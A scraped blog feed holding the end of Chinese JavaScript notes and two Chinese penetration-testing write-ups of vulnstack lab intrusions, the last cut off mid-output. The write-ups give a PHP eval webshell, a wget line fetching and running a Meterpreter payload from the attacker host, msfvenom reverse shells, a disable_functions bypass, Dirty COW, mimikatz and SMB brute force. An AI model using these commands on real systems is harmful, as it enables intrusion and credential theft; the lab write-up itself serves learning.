align="left">lastIndexOf()</td><td align="left">返回字符串中检索指定字符最后一次出现的位置</td></tr><tr><td align="left">localeCompare()</td><td align="left">用本地特定的顺序来比较两个字符串</td></tr><tr><td align="left">match()</td><td align="left">找到一个或多个正则表达式的匹配</td></tr><tr><td align="left">replace()</td><td align="left">替换与正则表达式匹配的子串</td></tr><tr><td align="left">search()</td><td align="left">检索与正则表达式相匹配的值</td></tr><tr><td align="left">slice()</td><td align="left">提取字符串的片断，并在新的字符串中返回被提取的部分</td></tr><tr><td align="left">split()</td><td align="left">把字符串分割为子字符串数组</td></tr><tr><td align="left">substr()</td><td align="left">从起始索引号提取字符串中指定数目的字符</td></tr><tr><td align="left">substring()</td><td align="left">提取字符串中两个指定的索引号之间的字符</td></tr><tr><td align="left">toLocaleLowerCase()</td><td align="left">根据主机的语言环境把字符串转换为小写，只有几种语言（如土耳其语）具有地方特有的大小写映射</td></tr><tr><td align="left">toLocaleUpperCase()</td><td align="left">根据主机的语言环境把字符串转换为大写，只有几种语言（如土耳其语）具有地方特有的大小写映射</td></tr><tr><td align="left">toLowerCase()</td><td align="left">把字符串转换为小写</td></tr><tr><td align="left">toString()</td><td align="left">返回字符串对象值</td></tr><tr><td align="left">toUpperCase()</td><td align="left">把字符串转换为大写</td></tr><tr><td align="left">trim()</td><td align="left">移除字符串首尾空白</td></tr><tr><td align="left">valueOf()</td><td align="left">返回某个字符串对象的原始值</td></tr></tbody></table><h1 id="JavaScript-运算符"><a href="#JavaScript-运算符" class="headerlink" title="JavaScript 运算符"></a>JavaScript 运算符</h1><hr><p><strong>运算符 = 用于赋值。</strong></p><p><strong>运算符 + 用于加值。</strong></p><h2 id="用于字符串的-运算符"><a href="#用于字符串的-运算符" class="headerlink" title="用于字符串的 + 运算符"></a>用于字符串的 + 运算符</h2><p>+ 运算符用于把文本值或字符串变量加起来（连接起来）。</p><p>如需把两个或多个字符串变量连接起来，请使用 + 运算符。</p><h2 id="对字符串和数字进行加法运算"><a href="#对字符串和数字进行加法运算" class="headerlink" title="对字符串和数字进行加法运算"></a>对字符串和数字进行加法运算</h2><p>两个数字相加，返回数字相加的和，如果数字与字符串相加，返回字符串，如下实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x=5+5;</span><br><span class="line">y=&quot;5&quot;+5;</span><br><span class="line">z=&quot;Hello&quot;+5;</span><br><span class="line"></span><br><span class="line">*x*,*y*, 和 *z* 输出结果为:</span><br><span class="line"></span><br><span class="line">10</span><br><span class="line">55</span><br><span class="line">Hello</span><br></pre></td></tr></table></figure><h1 id="JavaScript-比较-和-逻辑运算符"><a href="#JavaScript-比较-和-逻辑运算符" class="headerlink" title="JavaScript 比较 和 逻辑运算符"></a>JavaScript 比较 和 逻辑运算符</h1><p>比较和逻辑运算符用于测试 <em>true</em> 或者 <em>false</em>。</p><hr><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p>比较运算符在逻辑语句中使用，以测定变量或值是否相等。</p><p>x=5，下面的表格解释了比较运算符：</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">比较</th><th align="left">返回值</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">==</td><td align="left">等于</td><td align="left">x==8</td><td align="left"><em>false</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison1">实例 »</a></td></tr><tr><td align="left">x==5</td><td align="left"><em>true</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison2">实例 »</a></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">===</td><td align="left">绝对等于（值和类型均相等）</td><td align="left">x===”5”</td><td align="left"><em>false</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison3">实例 »</a></td></tr><tr><td align="left">x===5</td><td align="left"><em>true</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison4">实例 »</a></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">!=</td><td align="left">不等于</td><td align="left">x!=8</td><td align="left"><em>true</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison5">实例 »</a></td></tr><tr><td align="left">!==</td><td align="left">不绝对等于（值和类型有一个不相等，或两个都不相等）</td><td align="left">x!==”5”</td><td align="left"><em>true</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison6">实例 »</a></td></tr><tr><td align="left">x!==5</td><td align="left"><em>false</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison7">实例 »</a></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">&gt;</td><td align="left">大于</td><td align="left">x&gt;8</td><td align="left"><em>false</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison8">实例 »</a></td></tr><tr><td align="left">&lt;</td><td align="left">小于</td><td align="left">x&lt;8</td><td align="left"><em>true</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison9">实例 »</a></td></tr><tr><td align="left">&gt;=</td><td align="left">大于或等于</td><td align="left">x&gt;=8</td><td align="left"><em>false</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison10">实例 »</a></td></tr><tr><td align="left">&lt;=</td><td align="left">小于或等于</td><td align="left">x&lt;=8</td><td align="left"><em>true</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison11">实例 »</a></td></tr></tbody></table><hr><h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><p>可以在条件语句中使用比较运算符对值进行比较，然后根据结果来采取行动：</p><p>if (age&lt;18) x=”Too young”;</p><p>您将在本教程的下一节中学习更多有关条件语句的知识。</p><hr><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>逻辑运算符用于测定变量或值之间的逻辑。</p><p>给定 x=6 以及 y=3，下表解释了逻辑运算符：</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">例子</th></tr></thead><tbody><tr><td align="left">&amp;&amp;</td><td align="left">and</td><td align="left">(x &lt; 10 &amp;&amp; y &gt; 1) 为 true</td></tr><tr><td align="left">||</td><td align="left">or</td><td align="left">(x==5 || y==5) 为 false</td></tr><tr><td align="left">!</td><td align="left">not</td><td align="left">!(x==y) 为 true</td></tr></tbody></table><hr><h2 id="条件运算符"><a href="#条件运算符" class="headerlink" title="条件运算符"></a>条件运算符</h2><p>JavaScript 还包含了基于某些条件对变量进行赋值的条件运算符。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><em>variablename</em>=(<em>condition</em>)?<em>value1</em>:<em>value2</em> </p><p>如果变量 age 中的值小于 18，则向变量 voteable 赋值 “年龄太小”，否则赋值 “年龄已达到”。</p><p><code>voteable=(age&lt;18)?&quot;年龄太小&quot;:&quot;年龄已达到&quot;;</code></p><h1 id="JavaScript-if…Else-语句"><a href="#JavaScript-if…Else-语句" class="headerlink" title="JavaScript if…Else 语句"></a>JavaScript if…Else 语句</h1><p>和其他语言相近</p><h1 id="JavaScript-for-循环"><a href="#JavaScript-for-循环" class="headerlink" title="JavaScript for 循环"></a>JavaScript for 循环</h1><hr><p>循环可以将代码块执行指定的次数。</p><h2 id="For-In-循环"><a href="#For-In-循环" class="headerlink" title="For/In 循环"></a>For/In 循环</h2><p>JavaScript for/in 语句循环遍历对象的属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var person=&#123;fname:&quot;Bill&quot;,lname:&quot;Gates&quot;,age:56&#125;;   for (x in person)  // x 为属性名 &#123;    txt=txt + person[x]; &#125;</span><br></pre></td></tr></table></figure><h1 id="JavaScript-while-循环"><a href="#JavaScript-while-循环" class="headerlink" title="JavaScript while 循环"></a>JavaScript while 循环</h1><hr><p>只要指定条件为 true，循环就可以一直执行代码块</p><blockquote><p>定义了数组后对数组进行赋值，中间如有某些下标未被使用（即未被赋值），在遍历的时候，采用一般的 for 循环和 for…in 循环得到的结果不同。</p><p>for…in 循环会自动跳过那些没被赋值的元素，而 for 循环则不会，它会显示出 undefined。</p><p>点击下面的按钮，循环遍历</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;button onclick=&quot;myFunction()&quot;&gt;点击这里&lt;/button&gt;</span><br><span class="line">&gt;&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span><br><span class="line">&gt;&lt;script&gt;</span><br><span class="line">&gt;function myFunction()&#123;</span><br><span class="line">   var array = new Array();</span><br><span class="line">   var x;</span><br><span class="line">   var txt=&quot;&quot;</span><br><span class="line">   array[0] = 1;</span><br><span class="line">   array[3] = 2;</span><br><span class="line">   array[4] = 3;</span><br><span class="line">   array[10] = 4;</span><br><span class="line">   for( x in array )&#123;</span><br><span class="line">       alert(array[x]);     // 依次显示出 1 2 3 4</span><br><span class="line">   &#125; </span><br><span class="line">   alert(array.length);    // 结果是11</span><br><span class="line">   for( var i=0 ; i&lt;4 ; i++)&#123;</span><br><span class="line">       alert(array[i]);     // 依次显示出 1 undefined undefined 2 </span><br><span class="line">   &#125;</span><br><span class="line">   document.getElementById(&quot;demo&quot;).innerHTML = txt;</span><br><span class="line">&gt;&#125;</span><br><span class="line">&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> -js笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulstrack(三)挨打实录</title>
      <link href="/2021/11/19/vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/"/>
      <url>/2021/11/19/vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>vulstrack（三）</p><p>挨打实录</p><p>ip：<a href="http://10.203.87.242/">http://10.203.87.242/</a> </p><p>开局一个joomla 百度搜了下家谱  直接开盒</p><p><img src="image-20211118140446126.png" alt="image-20211118140446126"></p><p> 扫下   端口   扫下  目录</p><p><img src="image-20211118152707664.png" alt="image-20211118152707664"></p><p><img src="image-20211118153756313.png" alt="image-20211118153756313"></p><p><img src="image-20211118154240878.png" alt="image-20211118154240878"></p><p><img src="image-20211118155923176.png" alt="image-20211118155923176"></p><p>御剑用一半怕崩 找个工具  joomscan  工具扫到挺多</p><p>主要这个配置文件 里边有密钥 和数据库账号密码 </p><p><code>http://10.203.87.242/configuration.php~</code></p><p><img src="image-20211118162342980.png" alt="image-20211118162342980"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¯·ç¨å€™è®¿é—®ã€‚&#x27;; public $display_offline_message = &#x27;1&#x27;; public $offline_image = &#x27;&#x27;; public $sitename = &#x27;test&#x27;; public $editor = &#x27;tinymce&#x27;; public $captcha = &#x27;0&#x27;; public $list_limit = &#x27;20&#x27;; public $access = &#x27;1&#x27;; public $debug = &#x27;0&#x27;; public $debug_lang = &#x27;0&#x27;; public $debug_lang_const = &#x27;1&#x27;; public $dbtype = &#x27;mysqli&#x27;; public $host = &#x27;localhost&#x27;; public $user = &#x27;testuser&#x27;; public $password = &#x27;cvcvgjASD!@&#x27;; public $db = &#x27;joomla&#x27;; public $dbprefix = &#x27;am2zu_&#x27;; public $live_site = &#x27;&#x27;; public $secret = &#x27;gXN9Wbpk7ef3A4Ys&#x27;; public $gzip = &#x27;0&#x27;; public $error_reporting = &#x27;default&#x27;; public $helpurl = &#x27;https://help.joomla.org/proxy?keyref=Help&#123;major&#125;&#123;minor&#125;:&#123;keyref&#125;&amp;lang=&#123;langcode&#125;&#x27;; public $ftp_host = &#x27;&#x27;; public $ftp_port = &#x27;&#x27;; public $ftp_user = &#x27;&#x27;; public $ftp_pass = &#x27;&#x27;; public $ftp_root = &#x27;&#x27;; public $ftp_enable = &#x27;0&#x27;; public $offset = &#x27;UTC&#x27;; public $mailonline = &#x27;1&#x27;; public $mailer = &#x27;mail&#x27;; public $mailfrom = &#x27;test@test.com&#x27;; public $fromname = &#x27;test&#x27;; public $sendmail = &#x27;/usr/sbin/sendmail&#x27;; public $smtpauth = &#x27;0&#x27;; public $smtpuser = &#x27;&#x27;; public $smtppass = &#x27;&#x27;; public $smtphost = &#x27;localhost&#x27;; public $smtpsecure = &#x27;none&#x27;; public $smtpport = &#x27;25&#x27;; public $caching = &#x27;0&#x27;; public $cache_handler = &#x27;file&#x27;; public $cachetime = &#x27;15&#x27;; public $cache_platformprefix = &#x27;0&#x27;; public $MetaDesc = &#x27;&#x27;; public $MetaKeys = &#x27;&#x27;; public $MetaTitle = &#x27;1&#x27;; public $MetaAuthor = &#x27;1&#x27;; public $MetaVersion = &#x27;0&#x27;; public $robots = &#x27;&#x27;; public $sef = &#x27;1&#x27;; public $sef_rewrite = &#x27;0&#x27;; public $sef_suffix = &#x27;0&#x27;; public $unicodeslugs = &#x27;0&#x27;; public $feed_limit = &#x27;10&#x27;; public $feed_email = &#x27;none&#x27;; public $log_path = &#x27;/var/www/html/administrator/logs&#x27;; public $tmp_path = &#x27;/var/www/html/tmp&#x27;; public $lifetime = &#x27;15&#x27;; public $session_handler = &#x27;database&#x27;; public $shared_session = &#x27;0&#x27;; &#125;</span><br></pre></td></tr></table></figure><p>可以连3306</p><p><img src="image-20211118162420539.png" alt="image-20211118162420539"></p><p>nice</p><p><img src="image-20211118162526891.png" alt="image-20211118162526891"></p><p>什么阴间密码 能不能自己创建一个 </p><p><img src="image-20211118163059085.png" alt="image-20211118163059085"></p><p>俩模板   用户创建错地方   纯纯slm了         </p><p>哥斯拉还跑出来一个root密码</p><p><img src="image-20211118170554998.png" alt="image-20211118170554998"></p><p>mysql写马不管是 爆破出的root还是testuser没有权限</p><p>百度复制了一个类似密码  直接改了超管密码  </p><p>进入后台发现省去了添加后台超管的步骤 属于是快乐少一半 </p><p>直接使用超级管理员用户，修改<code>Beez3</code>模板的<code>error.php</code>文件</p><p>写入我的小摩托 </p><p>传马一连   （1.php是phpinfo  2.php是预留后门  爆破可以上车）</p><p><img src="image-20211118174154671.png" alt="image-20211118174154671"></p><p>发现  需要         bypass disable_functions</p><p>尝试执行命令，返回ret=127，</p><p>应该是disable_functions的限制了</p><p>通过phpinfo发现禁用了如下函数，目标是linux</p><p><img src="image-20211118183459566.png" alt="image-20211118183459566"></p><p>百度了解到  这个 加上 没有禁用putenv函数，所以可以</p><p><code>利用LD_PRELOAD绕过</code>这里需要学习 </p><p><img src="image-20211118191853428.png" alt="image-20211118191853428">虽然是个低权  头一次这么绕过     忘了蚁剑还有个插件了 、、</p><p><img src="image-20211118201050708.png" alt="image-20211118201050708"></p><p>上祖训  </p><p><code>ifconfig </code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.203.87.242/templates/beez3/bypass_disablefunc.php?cmd=ifconfig&amp;outpath=/tmp/smartb&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure><p><img src="image-20211118192019962.png" alt="image-20211118192019962"></p><p>查看ip信息，发现ip并不是<code>10.203.87.242 </code>是</p><p><img src="image-20211118192226867.png" alt="image-20211118192226867"></p><p>这台是个<code>ubuntu </code>  由于知识浅陋 不是很了解端口映射 猜到是是反向代理   </p><p>ubuntu应该是不出网的</p><p>应该要拿centos的权限</p><p>捣鼓半天  啥也没弄得到  乱翻var和   tmp找  找到敏感文件</p><p><img src="image-20211118195155510.png" alt="image-20211118195155510"></p><p>这adduser是新增用户 </p><p>Centos试试 ssh10.203.87.242连xshell </p><p><img src="image-20211118200019099.png" alt="image-20211118200019099"></p><p>又是  低权  吐了  （后来发现 可以爆破root密码  干）</p><p><img src="image-20211118200130214.png" alt="image-20211118200130214"></p><p>传奇再现     一块 <code>10.203.87.242</code>  一块<code>192.168.93.100</code></p><p>还得信息搜集一波  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[wwwuser@localhost ~]$ uname -a</span><br><span class="line">Linux localhost.localdomain 2.6.32-431.el6.x86_64 #1 SMP Fri Nov 22 03:15:09 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure><p>又要 横向移动 </p><p>centos也得 提权  因为只有他是出网机 </p><p>需要把他作为横向移动的跳板  </p><p>使用脏牛  范围 包括这个 centos</p><p> 提权成功</p><p><img src="image-20211118205903081.png" alt="image-20211118205903081"></p><p><img src="image-20211118210008632.png" alt="image-20211118210008632"></p><p>网络拓补</p><table><thead><tr><th>ip</th><th>系统</th><th>任务</th><th>权限</th><th>端口</th></tr></thead><tbody><tr><td>192.168.93.10</td><td>Windows Server 2012</td><td>域控</td><td></td><td>88，135，445</td></tr><tr><td>192.168.93.20</td><td>Windows2008</td><td></td><td></td><td>80、135、139、445、1433</td></tr><tr><td>192.168.93.30</td><td>windows7</td><td></td><td></td><td>445，135</td></tr><tr><td>192.168.93.100</td><td>Centos</td><td>出网机</td><td></td><td>22，80，3306</td></tr><tr><td>192.168.93.120</td><td>Ubuntu</td><td>web服务</td><td></td><td>22，3306</td></tr></tbody></table><p>可以使用  frp 搭建隧道 时间久远  都快忘了 复习复习  </p><p><img src="image-20211119144455252.png" alt="image-20211119144455252"></p><p>或者 msf  天可怜见特意装了个msf5 终于上线  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Kali</span><br><span class="line"></span><br><span class="line">use web_delivery</span><br><span class="line">set target 6</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 10.203.87.193</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br><span class="line">记得添加路由</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.203.87.242机器   </span><br><span class="line">wget -qO 8WMytsrE --no-check-certificate http://10.203.87.193:8080/2yJcTOurU6QbLBM; chmod +x 8WMytsrE; ./8WMytsrE&amp;</span><br></pre></td></tr></table></figure><p><img src="image-20211119152731995.png" alt="image-20211119152731995"></p><p><code>search scanner/smb/smb_version</code></p><p>发现3台windows，并且存在TEST域环境</p><p><img src="image-20211119153611258.png" alt="image-20211119153611258"></p><p><code>scanner/smb/smb_login</code>爆破smb<code> 192.168.93.20</code></p><p>这里  新装的kali 传文件是在费劲  假装爆破出来了  </p><p><img src="image-20211119155642223.png" alt="image-20211119155642223"></p><p>看超级无敌的husins的wp发现还可以爆破  暴力穷举  使用fscan</p><p>下面  psexec登陆win2008</p><p>meterpreter中进入shell</p><p><code>ps</code>查看进程  2752 explor.exe的adminnistor格外深情</p><p><img src="image-20211119162931113.png" alt="image-20211119162931113"></p><p>迁移到 administrator</p><p><img src="image-20211119162949151.png" alt="image-20211119162949151"></p><p>这里不会用 现学</p><p><code>load mimikatz</code></p><p><code>kerberos</code></p><p><img src="image-20211119162855197.png" alt="image-20211119162855197"></p><p><code>msv</code></p><p><img src="image-20211119163022698.png" alt="image-20211119163022698"></p><p><code>ipconfig -all </code></p><p><strong>定位到dns服务器为192.168.93.10，域名为test.org，一般dns服务器就是域控</strong></p><p><img src="image-20211119163350139.png" alt="image-20211119163350139"></p><p>进入shell信息收集  ping一下域控找ip</p><p><img src="image-20211119164341610.png" alt="image-20211119164341610"></p><p>ipc连接拿flag</p><p>什么是IPC$: 是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。</p><blockquote><p>又是新知识   </p></blockquote><p><img src="image-20211119164629566.png" alt="image-20211119164629566"></p><p><img src="image-20211119165448194.png" alt="image-20211119165448194"></p><p>反思：</p><p>1：对于cms了解不多 joomla!这次是第一次见到 后台模板getshell的时候多少沾点笨，对于mysql管理工具的使用不够熟练 写mysql写shell不熟练 里边两套表加用户还上当了改错了user表  joomscan真好用  、</p><p>2.bypassdisbale_functions 这个东西头一次 实际遇到 </p><p>3.本机敏感文件搜集  能找到密码   挺多密码可以爆破  这个是 遗漏的地方  </p><p>4.linux提权   脏牛的使用  和web_delivery模块 都是头一次用    其实frp啥的都行</p><p>5.横向移动      <code> smb_version+smb_login</code>主机探测加爆破 有很多方法   fscan可行 别的都挺多</p><p>6.psexec获取目标shell  mimikatz抓取明文密码  命令不会</p><p>7.获取域控shell看到有人用impacket  没用明白  看大帅哥的wp学的ipc</p><p>8.网络拓补很重要  一定要记得高低整明白 为啥下一步做什么  </p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulstrack（一）</title>
      <link href="/2021/11/13/%E7%AC%AC%E4%BA%8C%E5%91%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E5%AE%9E%E8%B7%B5/"/>
      <url>/2021/11/13/%E7%AC%AC%E4%BA%8C%E5%91%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<p>ip 10.203.87.175</p><p>先扫端口  </p><p><img src="image-20211010203614556.png" alt="image-20211010203614556"></p><p>进来是个这</p><p>phpmyadmin 初始密码<code>root</code> 进去了   </p><p>百度一下，phpMyAdmin怎么拿shell，点击变量开启日志文件，然后设置日志文件的存储路径</p><p>点击sql，创建日志文件，并定义它的路径<br><code>SET GLOBAL general_log_file=&#39;C:/phpStudy/www/123.php&#39;</code><br>查看日志功能是否开启<br><code>show variables like &#39;%general%&#39;;</code></p><p><img src="image-20211010204902729.png" alt="image-20211010204902729"></p><p>确定日志文件开启，路径也确定了。那就可以开搞了，写入一句话<br><code>select &#39;&lt;?php eval($_POST[mbg]);?&gt;&#39;</code></p><p><img src="image-20211010204947015.png" alt="image-20211010204947015"></p><p>祭蚁剑</p><p><img src="image-20211010205158961.png" alt="image-20211010205158961"></p><p>拿下这个了</p><p>传自己的马 然后 删日志文件 </p><p>控制台  <code>ipconfig /all</code></p><p><img src="image-20211010205446759.png" alt="image-20211010205446759"></p><p>应该是这个192.168.52.128的内网了   </p><p>可以ping通</p><p><img src="image-20211010213110118.png" alt="image-20211010213110118"></p><p>giegie的博客 真好</p><p>感觉蚁剑属实有点拉跨  就上冰蝎了  </p><p><img src="image-20211014183309669.png" alt="image-20211014183309669"></p><p>又传了个大马</p><p>创建新用户  <code>admin1 Cc123456.</code></p><p>没有开启 3389 端口</p><p>执行语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=``&#x27;%COMPUTERNAME%&#x27;` `call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure><p>执行结果</p><p><img src="image-20211014192536366.png" alt="image-20211014192536366"></p><p>上 远程桌面  。 。。。</p><p><img src="image-20211014193533904.png" alt="image-20211014193533904"></p><p><code>net group &quot;domain admins&quot; /domain</code></p><p><img src="image-20211014195021705.png" alt="image-20211014195021705"></p><p><code>systeminfo</code></p><p><img src="image-20211014195905908.png" alt="image-20211014195905908"></p><p><img src="image-20211014195921839.png" alt="image-20211014195921839"></p><p><code>wmic useraccount get /all</code></p><p><img src="image-20211014200202235.png" alt="image-20211014200202235"></p><p>下一步应该是探测其他主机来着</p><p>还得是meterpreter</p><p>上 msf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.203.87.148 LPORT=5556 -f exe &gt; dm.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">show options</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 10.203.87.148</span><br><span class="line">set Lport 5556</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="image-20211018161928311.png" alt="image-20211018161928311"></p><p><code>ipconfig</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ipconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : Software Loopback Interface 1</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 4294967295</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 11</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC : 00:0c:29:cf:6e:ca</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 10.203.87.175</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::647d:d2d9:c482:23ec</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 12</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line">IPv6 Address : fe80::5efe:acb:57af</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 14</span><br><span class="line">============</span><br><span class="line">Name         : Bluetooth s Adapter</span><br><span class="line">Hardware MAC : 00:1a:7d:da:71:11</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 169.254.157.252</span><br><span class="line">IPv4 Netmask : 255.255.0.0</span><br><span class="line">IPv6 Address : fe80::4dfb:3571:6e28:9dfc</span><br><span class="line">IPv6 Netmask : 